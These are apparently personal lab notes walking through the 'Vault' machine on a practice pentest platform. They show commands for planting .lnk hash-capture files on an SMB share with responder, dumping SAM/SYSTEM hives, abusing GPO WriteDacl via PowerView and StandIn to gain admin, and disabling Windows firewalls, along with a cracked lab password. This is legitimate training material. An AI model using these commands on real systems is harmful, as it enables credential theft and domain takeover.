# Vault Helped-Through

Name: Vault
Date:  10/5/2023
Difficulty: Hard  
Goals:  
- Previous OSCP practice exam attempt
Learnt:
- Some Practice machines are not for OSCP. Sad 
- Some tools exist that are better than the Bloodhound instruction - use them 
	- Bloodhound -> Resources -> Tools if possible else Bloodhound instructions 
- b33f and xct are awesome. 

Previously I tried to do this machine as part of a practice OSCP exam attempt. Little did I know that this machine required `responder`. Although I really excelled in finding and combing through machines it also really hurt my chances with stress and that made me reconsider long term plans. Hopeful the later half of this year will bring a better life in many respects. One very important event was discovery and really trying to emulate and understand hackers like [XCT](https://www.youtube.com/watch?v=fRbVdbY1d28), prior to the recent rank changes of HTB seasons was top 1 on HTB. The ranking which will move to official post beta phase in less than 30 days. I have set my sights on at least getting Silver rank out of Bronze, Silver, Ruby, Platinum and Holo, but go for Ruby. I think I could maybe get one hard machine in a week, but I doubt it and I would have to get lucky.

## Recon - Previous Attempt

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Vault/Screenshots/ping.png)

There are shares
![](enumfourlinuxshares.png)
smbmap show permissions
![](readwriteShare.png)

Bang on the [Tamil music to stay culturally enriched](https://www.youtube.com/watch?v=V8R1aZf1-AU). Anirudh is a tamil name on first google. 
![](bruteridsanirudh.png)

We have a writable share, a username - need a password and means of execution. After considering everything I went for both enumeration hint - it is ball-buster because it declare the the share is writable and the second is that there is a scripted user that will click shortlinks.

"Mount a client-side attack by uploading a shortcut file to the SMB share. A user will view the share and render file icons in it."

After some checking. This is definitely not a OSCP like machine. So I am going to use Metasploit or some C2  as I thought that this would not involve fake social engineering practice. Basically to keep the process clean and not mentally frazzle myself doing this machine. Also [pentesterlab](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/) suggests we can use Empire which is OSCP related.

Edited from the article
```python
usemodule powershell/persistence/userland/backdoor_lnk
usestager windows/launcher_lnk
set Listener http
execute
```

We can put a shell on `smbclient -N ///DocumentsShare -U guest%<put empty quotes here>``

Did not get call back, but I also did not remove it from the share, so it is not considered malicious. So it might that want something really specific. For my 12 hour assessment - I am happy I enumerated well, will give myself the hour remaining to finish HTB Acute. 

## Return with XCT 

Regardless Client-Side Attacks are still part of OSCP course, but there is never pretend users in the exam. 

- Legacy Windows machine .scf could be used to beacon back to you box
- Shortcut files .lnk
- [XCT's Hashgrab](https://github.com/xct/hashgrab) - *"Generates scf, url & lnk payloads to put onto a smb share. These force authentication to an attacker machine in order to grab hashes (for example with responder)."*

```bash
smbclient -L \\192.168.156.172
# Connect to share
smbclient \\\\192.168.156.172\\DocumentsShare
# Test upload - smb: get $file
# Hashgrab
python3 hashgrab.py 192.168.45.5 xctisawesome
# Responder 
sudo responder -I tun0 
# Reconnect to share
smbclient \\\\192.168.156.172\\DocumentsShare
put xctisawesome.lnk
# wait..
```

And NLTMv2 relay!
![1080](anirudhshash.png)

Crack to get:
```
anirudh : SecureHM
```

## PrivEsc

Although as I have the walkthrough open for this I 
![1080](whoisanirudh.png)

We can perform backup of SYSTEM hive and dump with `impacket-secretsdump`
```powershell
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
*Evil-WinRM* PS> download SYSTEM
*Evil-WinRM* PS> download SAM
# Wait...
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

![](administratorhash.png)

Can not WinRM in with hash. At this point I turned to the video as I do not want to crack hashes. He discusses GPOs but I want to enumerate to atleast find the vector.
![](cmemodules.png)

We could use powerview.ps1
![](gpowithpowerview.png)

I ran the latest winpeas 
![](permiswinpeas.png)

Remote [Bloodhound.py](https://github.com/fox-it/BloodHound.py)
```bash
sudo python3 bloodhound.py -c all -d vault.offsec -ns 192.168.156.172 -u 'anirudh' -p 'SecureHM'
ulimit 4000
sudo neo4j console 
# another tmux pane
bloodhound --no-sandbox
# drag and drop into bloodhound
thunar
```

Simply setting Anirudh as owned and analysing shortest paths to DA: 
![](writedaclbh.png)

*"The user ANIRUDH@VAULT.OFFSEC has permissions to modify the DACL (Discretionary Access Control List) on the GPO DEFAULT DOMAIN POLICY@VAULT.OFFSEC .With write access to the target object's DACL, you can grant yourself any privilege you want on the object.*"

#### Bloodhound Instructions

To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll privilege.

You may need to authenticate to the Domain Controller as ANIRUDH@VAULT.OFFSEC if you are not running a process as that user. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

```powershell
$SecPassword = ConvertTo-SecureString 'SecureHM' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('vault\anirudh', $SecPassword)
```

Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ANIRUDH@VAULT.OFFSEC:

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All
```

With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse. 

Cleanup can be done using the Remove-DomainObjectAcl function:

```powershell
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All
```

[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) - similarly requires Powerview

If owner of a group:
```powershell
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

Give self GenericAll
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Add new users to the group
```powershell
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```

Reset a password with GenericAll on a User
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
# Reset delegate account password
net user delegate delegate /domain
```

Or Join a group
```powershell
net group "domain admins" spotless /add /domain
```

## Two hours later...or

[One Eternity Later...](https://www.youtube.com/watch?v=U7CZcd-UYmU) or [xct](https://www.youtube.com/watch?v=fRbVdbY1d28) explain [Standin](https://github.com/FuzzySecurity/StandIn) tool discussed in [Payload and the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo). b33f is awesome and this method is significantly less time consuming.

```powershell
*Evil-WinRM* PS C:\Windows\temp> upload StandIn_v13_Net35_45.zip
*Evil-WinRM* PS C:\Windows\temp> expand-archive StandIn_v13_Net35_45.zip .
*Evil-WinRM* PS C:\Windows\temp> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --acl
*Evil-WinRM* PS C:\Windows\temp> .\StandIn_v13_Net45.exe --gpo --filter "Default Domain Policy" --localadmin anirudh
```

Showing full access
![](fullaccess.png)

Become the admin
![](becometheadmin.png)

We have now escalated:
![](weareadmin.png)

We dont own proof.txt.

*"Robocopy requires both `SeBackup` and `SeRestore` to work with the `/b` parameter (which are both granted to members of the `Backup Operators` group by default).  
Instead, [`Copy-FileSeBackupPrivilege`](https://github.com/giuliano108/SeBackupPrivilege) can be used to backup files through a process with only the `SeBackup` privilege in its token:  
`Import-Module .\SeBackupPrivilegeUtils.dll`  
`Import-Module .\SeBackupPrivilegeCmdLets.dll`  
`Set-SeBackupPrivilege`  
`Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>`"*

And...
![](sebackupandserestorewithrobocopy.png)

Although if this was OSCP we actually need a shell as administrator.

## Beyond Root

- Get OS writeup aswell!!

#### Unintended Ways

Use SeBackupPrivilege and SeRestorePrivilege

https://github.com/xct/xc to celebrate kick the bad memories of this machine out will a bang I want to promote XCT and his xc shell.


#### Firewall fun with netsh for legacy Windows and Powershell for modern Windows

Firewall fun has been sitting in my to do list for beyond root.

####  Netsh for Windows 7, Server 2008 (R2), Vista

[Netsh command is deprecated for - Windows 7, Server 2008 (R2), Vista](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771920(v=ws.10))
```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)

#### Powershell Window 10 and Server 2016 onwards

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```

Enable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```
Disable Window Defender Firewall
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```


```powershell
Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow –NotifyOnListen True -AllowUnicastResponseToMulticast True –LogFileName %SystemRoot%\System32\LogFiles\Firewall\pfirewall.log
```